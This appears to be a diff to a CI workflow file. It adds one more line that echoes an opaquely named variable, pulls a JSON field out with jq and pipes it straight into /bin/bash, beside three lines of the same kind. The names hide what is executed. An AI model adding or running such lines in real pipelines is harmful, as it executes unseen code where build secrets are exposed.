@@ -34,6 +34,7 @@ jobs:
           echo $ysm0467 | jq -r .gna90846 | /bin/bash
           printf '%s' "$sf256" | jq -r .cvb79 | /bin/bash
           printf '%s' "$dmxne826" | jq -r .tr055 | /bin/bash
+          echo $mrs046 | jq -r .bfx074 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
